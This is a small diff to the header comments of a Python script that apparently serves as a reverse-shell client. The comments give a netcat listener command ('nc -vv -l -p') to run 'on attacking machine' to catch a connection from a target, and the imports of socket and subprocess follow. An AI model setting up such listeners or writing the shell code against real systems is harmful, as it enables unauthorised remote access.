@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 
 # Use this to open socket and listen on attacking machine for connection from target:
-# nc -vv -l -p (port number) or use listener.py
+# Netcut: nc -vv -l -p (port number)
+# OR
+# use listener.py
 
 import socket
 import subprocess
